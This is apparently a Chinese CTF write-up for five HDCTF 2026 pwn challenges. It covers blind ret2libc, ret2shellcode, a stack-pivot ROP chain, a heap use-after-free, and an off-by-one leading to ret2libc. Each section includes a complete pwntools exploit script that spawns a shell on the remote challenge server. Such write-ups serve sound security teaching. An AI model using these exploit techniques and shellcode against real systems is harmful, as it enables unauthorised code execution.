---
title: "HDCTF 2026"
date: 2026-09-30T15:00:00+08:00
draft: false
tags: ["CTF", "Pwn", "Writeup"]
categories: ["Writeup"]
summary: "HDCTF 2026 五道 pwn 题的题解：无附件盲打、Ret2Shellcode、签到、堆染钟楼（UAF）、监狱风云。"
ShowToc: true
---

## 异象pwn，泯除

无附件盲打 pwn

![题目给出的信息](/images/hdctf-2026/img01.jpeg)

没有附件的话能够拿到的信息很少，题目给出的就至关重要了

1. main 函数地址 `0x40161a`
2. `70-75-74-73` 看似没用，实则 16 进制转 ascii 值即为 puts，那我们就得到了 puts 的 plt 表和 got 表，这地址还是固定的
3. 同理得到 read got 表

![IDA 里的字符串](/images/hdctf-2026/img02.png)

其实看到上面就有 ret2libc 想法了，接下来随便输入看看

![输入测试](/images/hdctf-2026/img03.jpeg)

输入 126 个数字正常，输入 127 个数字就如图所示，这里发生了一些变化

输入 151 个字符触发上述第二种情况，152 个字符似乎就断开了（输入无反应）

合理推测栈溢出，并且 rbp 和 ret 在这附近

接下来尝试初步编写脚本，再偏移后加 main 地址测试正确偏移

测到偏移为 152，和推测差不多

之后泄露 puts 和 read 真实地址得到 libc 版本，再正常打就 OK 了

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
p = remote('150.242.245.3', 30703)

main = 0x40161a
pop_rdi = 0x4011da
ret = 0x4011db

puts_plt = 0x401090
puts_got = 0x404000
read_got = 0x404018

puts_offset = 0x80e50
read_offset = 0x114840
system_offset = 0x50d70
binsh_offset = 0x1d8678

offset = 152
p.recvrepeat(1)

payload = b'a' * offset
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload += p64(pop_rdi) + p64(read_got) + p64(puts_plt)
payload += p64(ret) + p64(main)
p.sendline(payload)
data = p.recvrepeat(1)

puts_addr = u64(data[0:6].ljust(8, b'\x00'))
read_addr = u64(data[7:13].ljust(8, b'\x00'))
print('puts_addr =', hex(puts_addr))
print('read_addr =', hex(read_addr))

libc_base = puts_addr - puts_offset
assert read_addr - libc_base == read_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset

print('libc_base =', hex(libc_base))
print('system =', hex(system))
print('binsh =', hex(binsh))

payload = b'a' * offset
payload += p64(pop_rdi) + p64(binsh)
payload += p64(ret) + p64(system)
p.sendline(payload)

p.interactive()
```

## Ret2shellcode

![题目信息](/images/hdctf-2026/img04.png)

![题目信息](/images/hdctf-2026/img05.jpeg)

提示 ret2shellcode，给了写入栈的地址，栈可执行

该怎么做还用我多说吗

往 buf 写入 shellcode，栈溢出跳回 buf 执行

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
# p = process('./pwn1')
p = remote("150.242.245.3", 31914)

p.recvuntil(b'buffer is at: ')
buf = int(p.recvline().strip(), 16)

shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    push 59
    pop rax
    syscall
''')

payload = shellcode.ljust(0x48, b' ')
payload += p64(buf)

p.recvuntil(b'interesting: ')
p.send(payload)
p.interactive()
```

## 签到

![题目信息](/images/hdctf-2026/img06.png)

![题目信息](/images/hdctf-2026/img07.png)

![题目信息](/images/hdctf-2026/img08.png)

Checksec 一下

![checksec 结果](/images/hdctf-2026/img09.jpeg)

有 canary 保护，但实际没看到，就先不管它，正常找找 gadget

这题在初见杀方面还是很权威的

初步考虑是往 bss 段（bin）上写内容，然后尝试栈溢出跳转执行

但这实际上是无法实现的

原因我们看看 vuln 的汇编代码

![vuln 函数汇编](/images/hdctf-2026/img10.png)

和常规的结尾不一样，此处采用 `mov rsp, [rbp+var_10]`

我们可以让 ai 看看

![AI 分析函数结尾](/images/hdctf-2026/img11.jpeg)

![AI 分析函数结尾](/images/hdctf-2026/img12.jpeg)

也就是说我们覆盖 `rbp-0x10` 的位置实际上控制了 rsp 的位置，程序再 ret 就会从我们设计好的 rop 链开始

```python
from pwn import *

context(log_level="debug", os="linux", arch="amd64")

# p = process("./pwn")
p = remote("150.242.245.3", 30600)

bin_addr = 0x4c7300

pop_rax = 0x401802
pop_rdi = 0x4017fc
pop_rsi = 0x4017fe
pop_rdx = 0x401800
syscall = 0x4017f5

p.recvuntil(b"registration form:")
bin_sh = bin_addr + 0x80

payload = p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)

payload = payload.ljust(0x80, b" ")
payload += b'/bin/sh\x00'

p.send(payload)

p.recvuntil(b"sign your name on the ticket:")
payload = b'A' * 64
payload += p64(bin_addr)
p.send(payload)
p.interactive()
```

## 堆染钟楼

来了来了，看了一天这玩意

先是一堆简介，再是看得头痛的代码，我们逐步分析

![题目与反编译代码](/images/hdctf-2026/img13.png)

![题目与反编译代码](/images/hdctf-2026/img14.jpeg)

首先是看看提示，我们先尝试找出爪牙、恶魔

（身份是每把变化的）

连按两次 1，第二次得到必为爪牙

接着按 4，有四次机会，每次确定三位，运气最差也能够找到恶魔了

先把恶魔杀死看看

3 杀爪牙，8 跳过，3 杀恶魔

![杀死恶魔](/images/hdctf-2026/img15.jpeg)

分析反编译代码我们可以得到这应该是一个堆块地址，我们等有需要再用他吧

![堆块地址](/images/hdctf-2026/img16.png)

有密钥藏在堆块偏移 16 处

此时前面选择 `6 1` 可以翻尸体记忆

![翻尸体记忆](/images/hdctf-2026/img17.png)

翻尸体选择偏移 16 得到密钥

![密钥](/images/hdctf-2026/img18.jpeg)

只是个小彩蛋

到这之后就要全局的掌控力了，前面的 `6 2`

![封印仪式](/images/hdctf-2026/img19.png)

![封印仪式](/images/hdctf-2026/img20.png)

可以对 `G.Corpse` 的某偏移进行八字节写入（封印仪式的二）

可以申请两个堆块

自由写入 24 字节内容，再写入确定偏移位置

前面我们杀死恶魔，此处申请很有可能对应恶魔那个 chunk

前面 free 了两次

一次 `free(p)`，一次 `free(G.soul)`

p 的指向

![p 的指向](/images/hdctf-2026/img21.png)

初始化游戏中灵魂大小

![初始化灵魂大小](/images/hdctf-2026/img22.png)

显然有可能复用 p

而杀死恶魔的代码又略有缺陷

![杀死恶魔的代码](/images/hdctf-2026/img23.jpeg)

并没有释放指针，我们再使用 6 就可以形成 uaf

再看封印仪式的三

![封印仪式三](/images/hdctf-2026/img24.png)

调用某 id 的 ability，此时一切都串起来了：我们先杀死恶魔

再利用封印的复活得到恶魔的 chunk

写入 binsh

```c
*((_QWORD *)hero + 5) = read_hex64()
```

对应 `hero[5]` 跳过 40 字节，而前面 p 指向结构体

![hero 结构体偏移](/images/hdctf-2026/img25.png)

跳过 40 字节后对应 ability

注意我们后面是可以利用封印 3 来调用 ability 的，那我们写入就可以写入 system 的地址

```c
G.players[i_0]->ability(G.players[i_0]);
```

参数就是我们最开始写入的 binsh

![ability 调用](/images/hdctf-2026/img26.png)

当然，调用英雄能力需要英雄活着

我们采用前面 `6 2` 食尸鬼能力写入 `G->corpse` 某一偏移

![食尸鬼能力](/images/hdctf-2026/img27.png)

但 3 处决时

![3 处决](/images/hdctf-2026/img28.png)

两个其实指向同一 chunk

我们利用食尸鬼能力修改结构体中 alive 为 1 使其活着

还有一件事，写入 binsh、system 自然不是直接写，是需要

libc 版本的

我们在一开始杀死恶魔后选择 `4` 偏移 `0`

![泄露堆块 fd 指针](/images/hdctf-2026/img29.png)

![泄露堆块 fd 指针](/images/hdctf-2026/img30.png)

可以得到堆块 fd 指针指向的位置

而这种大堆块指针释放后通常指向 `main_arena + 某偏移`

我们用泄露的指针地址 - libc 中 main_arena 地址 - 偏移，即得到

libc 基地址

此处 `main_arena + 某偏移` 可能需要用 gdb 调试来看，当然试试常见的地址也能试出来

```python
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

p = remote('150.242.245.3', 31675)
libc = ELF("./libc.so.6")
# p = process("./pwn")

try:
    p.interactive()
except KeyboardInterrupt:
    pass

print("\n[*] 进入自动模式（从主菜单开始）")
demon_id = int(input("恶魔编号 (0-8): "))
leak = int(input("libc leak (hex, 以 7f 开头): "), 16)

libc_base = leak - 0x21ace0
system = libc_base + libc.sym['system']
log.success(f'libc_base = {hex(libc_base)}')
log.success(f'system = {hex(system)}')

p.sendline(b'7')

p.sendline(b'1')
p.sendline(str(demon_id).encode())
p.sendline(input("key : ").encode())

p.sendline(b'2')
p.sendline(b'/bin/sh')
p.sendline(hex(system)[2:].encode())

p.sendline(b'0')

p.sendline(b'6')

p.sendline(b'2')
p.sendline(b'32')
p.sendline(b'1')

p.sendline(b'7')

p.sendline(b'3')
p.sendline(str(demon_id).encode())

p.interactive()
```

这个代码前面需要自己手动找

## 监狱风云

![题目代码](/images/hdctf-2026/img31.jpeg)

具体代码有些晦涩难懂，直接上手试试

![游戏逻辑代码](/images/hdctf-2026/img32.jpeg)

![游戏逻辑代码](/images/hdctf-2026/img33.jpeg)

大抵就是玩游戏拿分

![玩游戏拿分](/images/hdctf-2026/img34.png)

分析猜测过五轮后遇见律师有个栈溢出，前面四轮按照提示正常玩就行

合作/背叛：背叛 合作 合作，来到无面

![合作/背叛选择](/images/hdctf-2026/img35.jpeg)

对应代码

![对应代码](/images/hdctf-2026/img36.png)

先试试水

![先试试水的结果](/images/hdctf-2026/img37.jpeg)

20 轮 60 分，而无面只会背叛，显然正常玩是不行的

让我们分析代码，监狱长说只能写 32 字节

但我们可以看到实际为 33 字节，多一个字节有什么用呢？我们来看看 note 对应结构体构成

![note 结构体](/images/hdctf-2026/img38.png)

Note 背后接的是 strategy

![strategy 结构](/images/hdctf-2026/img39.jpeg)

理性猜测 strategy 影响的是 0/1（合作/背叛），我们试试多发一个 0

![多发一个 0 的结果](/images/hdctf-2026/img40.jpeg)

无面竟然也选择了合作，那我们也就通关了

此处对应我们前面得到的律师代码

![律师代码](/images/hdctf-2026/img41.png)

![律师代码](/images/hdctf-2026/img42.png)

ROPgadget 过滤得到 gadget，开始正常打 ret2libc

```python
from pwn import *

context(log_level="debug", os="linux", arch="amd64")
p = remote("150.242.245.3", 32720)
# p = process("./pwn1")
elf = ELF("./pwn1")
libc = ELF("./libc.so.6")

read_got = elf.got["read"]
puts_plt = 0x401080

pop_rdi = 0x00000000004011b6
ret = 0x000000000040101a
meet = 0x0000000000401509
menu = 0x0000000000401551

for i in range(20):
    p.recvuntil(b">")
    p.sendline(b"1")

for i in range(24):
    p.recvuntil(b">")
    p.sendline(b"0")

p.recvuntil(b">")
payload = b'0' * 33
p.sendline(payload)

for i in range(20):
    p.recvuntil(b">")
    p.sendline(b"0")

p.recvuntil(b">")
p.sendline(b"1")

p.recvuntil(b">")
payload = b'a' * 72 + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(menu)
p.send(payload)

p.recvline()
p.recvline()

leak = p.recv(6)
p.recv(1)
read_addr = u64(leak.ljust(8, b'\x00'))
print(f"{hex(read_addr)}")

libc_base = read_addr - libc.symbols['read']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

p.recvuntil(b">")
p.sendline(b"1")

p.recvuntil(b">")
payload = b'a' * 72 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.send(payload)

p.interactive()
```
